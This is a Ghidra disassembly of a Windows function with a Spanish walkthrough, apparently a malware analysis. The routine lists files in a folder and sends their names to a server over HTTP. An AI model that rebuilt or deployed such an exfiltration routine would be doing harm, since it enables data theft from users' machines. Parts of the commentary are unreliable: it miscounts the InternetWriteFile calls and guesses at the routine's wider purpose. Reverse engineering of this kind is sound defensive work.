```
                             //
                             // .text
                             // ram:00401000-ram:004019ff
                             //
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined __stdcall FUN_00401000(void)
                               assume FS_OFFSET = 0xffdff000
             undefined         <UNASSIGNED>   <RETURN>
             undefined1        Stack[-0x148   local_148                               XREF[1]:     0040100f(*)
                             FUN_00401000                                    XREF[3]:     00400124(*), 004001fc(*),
                                                                                          FUN_00401130:00401185(c)
        00401000 55              PUSH       EBP
        00401001 8b ec           MOV        EBP,ESP
        00401003 83 e4 f8        AND        ESP,0xfffffff8
        00401006 81 ec 44        SUB        ESP,0x144
                 01 00 00
        0040100c 53              PUSH       EBX
        0040100d 56              PUSH       ESI
        0040100e 57              PUSH       EDI
        0040100f 8d 44 24 10     LEA        EAX=>local_148,[ESP + 0x10]
        00401013 8b f1           MOV        ESI,ECX
        00401015 50              PUSH       EAX
        00401016 68 28 21        PUSH       DAT_00402128                                     = 5Ch    \
                 40 00
        0040101b ff 15 00        CALL       dword ptr [->KERNEL32.DLL::FindFirstFileA]       = 00002310
                 20 40 00
        00401021 8b f8           MOV        EDI,EAX
        00401023 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00
                 00 00
        0040102b 85 ff           TEST       EDI,EDI
        0040102d 0f 84 e5        JZ         LAB_00401118
                 00 00 00
        00401033 6a 00           PUSH       0x0
        00401035 68 00 00        PUSH       0x80000000
                 00 80
        0040103a 68 20 30        PUSH       PTR_s_text/html_00403020                         = 004020f0
                 40 00
        0040103f 6a 00           PUSH       0x0
        00401041 6a 00           PUSH       0x0
        00401043 68 fc 20        PUSH       DAT_004020fc                                     = 2Fh    /
                 40 00
        00401048 68 00 21        PUSH       DAT_00402100                                     = 50h    P
                 40 00
        0040104d 56              PUSH       ESI
        0040104e ff 15 b0        CALL       dword ptr [->WININET.DLL::HttpOpenRequestA]      = 0000238a
                 20 40 00
        00401054 6a 00           PUSH       0x0
        00401056 6a 00           PUSH       0x0
        00401058 6a 00           PUSH       0x0
        0040105a 8b f0           MOV        ESI,EAX
        0040105c 6a 00           PUSH       0x0
        0040105e 56              PUSH       ESI
        0040105f ff 15 bc        CALL       dword ptr [->WININET.DLL::HttpSendRequestExA]    = 0000234c
                 20 40 00
        00401065 8d 4c 24 3c     LEA        ECX,[ESP + 0x3c]
        00401069 8d 51 01        LEA        EDX,[ECX + 0x1]
        0040106c 8d 64 24 00     LEA        ESP,[ESP]
                             LAB_00401070                                    XREF[1]:     00401075(j)
        00401070 8a 01           MOV        AL,byte ptr [ECX]
        00401072 41              INC        ECX
        00401073 84 c0           TEST       AL,AL
        00401075 75 f9           JNZ        LAB_00401070
        00401077 8b 1d b4        MOV        EBX,dword ptr [->WININET.DLL::InternetWriteFile] = 00002376
                 20 40 00
        0040107d 8d 44 24 0c     LEA        EAX,[ESP + 0xc]
        00401081 50              PUSH       EAX
        00401082 2b ca           SUB        ECX,EDX
        00401084 8d 44 24 40     LEA        EAX,[ESP + 0x40]
        00401088 51              PUSH       ECX
        00401089 50              PUSH       EAX
        0040108a 56              PUSH       ESI
        0040108b ff d3           CALL       EBX=>WININET.DLL::InternetWriteFile
        0040108d 8d 44 24 0c     LEA        EAX,[ESP + 0xc]
        00401091 50              PUSH       EAX
        00401092 6a 01           PUSH       0x1
        00401094 68 08 21        PUSH       DAT_00402108                                     = 0Ah
                 40 00
        00401099 56              PUSH       ESI
        0040109a ff d3           CALL       EBX=>WININET.DLL::InternetWriteFile
        0040109c 8d 44 24 10     LEA        EAX,[ESP + 0x10]
        004010a0 50              PUSH       EAX
        004010a1 57              PUSH       EDI
        004010a2 ff 15 08        CALL       dword ptr [->KERNEL32.DLL::FindNextFileA]        = 0000232e
                 20 40 00
        004010a8 85 c0           TEST       EAX,EAX
        004010aa 7e 4a           JLE        LAB_004010f6
        004010ac 8d 64 24 00     LEA        ESP,[ESP]
                             LAB_004010b0                                    XREF[1]:     004010f4(j)
        004010b0 8d 44 24 3c     LEA        EAX,[ESP + 0x3c]
        004010b4 c7 44 24        MOV        dword ptr [ESP + 0xc],0x0
                 0c 00 00
                 00 00
        004010bc 8d 50 01        LEA        EDX,[EAX + 0x1]
        004010bf 90              NOP
                             LAB_004010c0                                    XREF[1]:     004010c5(j)
        004010c0 8a 08           MOV        CL,byte ptr [EAX]
        004010c2 40              INC        EAX
        004010c3 84 c9           TEST       CL,CL
        004010c5 75 f9           JNZ        LAB_004010c0
        004010c7 8d 4c 24 0c     LEA        ECX,[ESP + 0xc]
        004010cb 2b c2           SUB        EAX,EDX
        004010cd 51              PUSH       ECX
        004010ce 50              PUSH       EAX
        004010cf 8d 44 24 44     LEA        EAX,[ESP + 0x44]
        004010d3 50              PUSH       EAX
        004010d4 56              PUSH       ESI
        004010d5 ff d3           CALL       EBX=>WININET.DLL::InternetWriteFile
        004010d7 8d 44 24 0c     LEA        EAX,[ESP + 0xc]
        004010db 50              PUSH       EAX
        004010dc 6a 01           PUSH       0x1
        004010de 68 08 21        PUSH       DAT_00402108                                     = 0Ah
                 40 00
        004010e3 56              PUSH       ESI
        004010e4 ff d3           CALL       EBX=>WININET.DLL::InternetWriteFile
        004010e6 8d 44 24 10     LEA        EAX,[ESP + 0x10]
        004010ea 50              PUSH       EAX
        004010eb 57              PUSH       EDI
        004010ec ff 15 08        CALL       dword ptr [->KERNEL32.DLL::FindNextFileA]        = 0000232e
                 20 40 00
        004010f2 85 c0           TEST       EAX,EAX
        004010f4 7f ba           JG         LAB_004010b0
                             LAB_004010f6                                    XREF[1]:     004010aa(j)
        004010f6 6a 00           PUSH       0x0
        004010f8 6a 00           PUSH       0x0
        004010fa 6a 00           PUSH       0x0
        004010fc 56              PUSH       ESI
        004010fd ff 15 a8        CALL       dword ptr [->WININET.DLL::HttpEndRequestA]       = 000023ba
                 20 40 00
        00401103 56              PUSH       ESI
        00401104 ff 15 a0        CALL       dword ptr [->WININET.DLL::InternetCloseHandle]   = 000023dc
                 20 40 00
        0040110a 57              PUSH       EDI
        0040110b ff 15 04        CALL       dword ptr [->KERNEL32.DLL::FindClose]            = 00002322
                 20 40 00
        00401111 5f              POP        EDI
        00401112 5e              POP        ESI
        00401113 5b              POP        EBX
        00401114 8b e5           MOV        ESP,EBP
        00401116 5d              POP        EBP
        00401117 c3              RET
                             LAB_00401118                                    XREF[1]:     0040102d(j)
        00401118 6a 01           PUSH       0x1
        0040111a ff 15 34        CALL       dword ptr [->MSVCR120.DLL::exit]                 = 000023fe
                 20 40 00
                             -- Flow Override: CALL_RETURN (COMPUTED_CALL_TERMINATOR)
             assume FS_OFFSET = <UNKNOWN>
        00401120 cc              ??         CCh
             assume FS_OFFSET = 0xffdff000
        00401121 cc              ??         CCh
        00401122 cc              ??         CCh
        00401123 cc              ??         CCh
        00401124 cc              ??         CCh
        00401125 cc              ??         CCh
        00401126 cc              ??         CCh
        00401127 cc              ??         CCh
        00401128 cc              ??         CCh
        00401129 cc              ??         CCh
        0040112a cc              ??         CCh
        0040112b cc              ??         CCh
        0040112c cc              ??         CCh
        0040112d cc              ??         CCh
        0040112e cc              ??         CCh
        0040112f cc              ??         CCh


```

Esta función (FUN_00401000) representa un **comportamiento de tipo dropper o exfiltrador de información**, con uso explícito de la API de Windows para recorrer archivos y hacer peticiones HTTP usando WININET.DLL. Vamos a desglosarla paso a paso:

### 📌 RESUMEN GENERAL DE LO QUE HACE

- Usa FindFirstFileA y FindNextFileA para recorrer archivos de una carpeta.
- Crea una conexión HTTP con HttpOpenRequestA y la envía con HttpSendRequestExA.
- Usa InternetWriteFile para enviar el nombre (o contenido) de archivos a través de la conexión HTTP.
- Finaliza la petición con HttpEndRequestA, cierra el handle HTTP y los handles de archivos.

### 🧠 ANÁLISIS DETALLADO  
🔹 Inicio típico de función C compilada
```
00401000 PUSH       EBP
00401001 MOV        EBP,ESP
00401003 AND        ESP,0xfffffff8
00401006 SUB        ESP,0x144
```
Reserva stack y alinea el puntero de pila.

🔹 Inicialización y primer acceso a archivos
```
0040100f LEA        EAX,[ESP + 0x10]      ; puntero a estructura WIN32_FIND_DATA
00401013 MOV        ESI,ECX               ; copia ECX (parámetro oculto stdcall)
00401015 PUSH       EAX                   ; arg para FindFirstFileA
00401016 PUSH       DAT_00402128          ; patrón de búsqueda (probable "*.*")
0040101b CALL       [FindFirstFileA]
```
Está recorriendo archivos en alguna carpeta.

DAT_00402128 contiene el patrón, probablemente "*" o "C:\\algo\\*".

🔹 Comprobación si se encontró algún archivo
```
0040102b TEST       EDI,EDI
0040102d JZ         LAB_00401118
```

Si FindFirstFileA falla, se hace exit(1).

--------------------
### 🌐 Inicio de comunicación HTTP
```
0040104e CALL       [HttpOpenRequestA] ; crea la petición HTTP (GET, POST, etc.)
0040105f CALL       [HttpSendRequestExA] ; envía cabecera HTTP
```
Parámetros previos incluyen:
- "text/html" como tipo de contenido.
- Otros datos de la URL en DAT_004020fc, DAT_00402100...

👉 Está iniciando una conexión HTTP POST/GET a un servidor remoto, probablemente para enviar datos de los archivos encontrados.

-----------------------------
###  🧾 Envía contenido a través de InternetWriteFile
```
MOV        EBX,[WININET.DLL::InternetWriteFile]
CALL       EBX
```
Este patrón aparece tres veces:
- Una vez por cada archivo encontrado.
- Incluye:
    - Nombre del archivo
    - Contenido asociado (posiblemente no el contenido del archivo, sino solo metadatos).

-----------------------------------

###  🔁 Bucle de búsqueda de archivos
```
CALL       [FindNextFileA]
JLE        -> rompe el bucle si ya no hay más archivos
JG         -> sigue al siguiente archivo
```

--------------------------------------------
### 🧹 Limpieza y cierre
```
HttpEndRequestA
InternetCloseHandle
FindClose
RET
```

-----------------------------------------------
###  ❌ Comportamiento si falla FindFirstFileA:
```
00401118 PUSH 0x1
CALL [MSVCR120.DLL::exit]
```
Termina el proceso con exit(1).

--------------------------------------------
### 🕵️ INDICIOS DE COMPORTAMIENTO MALICIOSO
| Evidencia	 | Implicación |
| -- | -- |
| FindFirstFileA y FindNextFileA	| Recorre el sistema de archivos |
| HttpOpenRequestA, HttpSendRequestExA	| Establece comunicación HTTP |
| InternetWriteFile	| Envía datos al servidor |
| HttpEndRequestA + InternetCloseHandle	| Limpieza de conexión |
| MSVCR120.DLL::exit(1) en error	| Finaliza discretamente si falla algo |

🔎 Posible uso  
- Este binario recorre archivos en el sistema y los exfiltra a un servidor remoto a través de peticiones HTTP.
- Es un comportamiento clásico de un infostealer o dropper que recopila información antes de descargar más payloads.



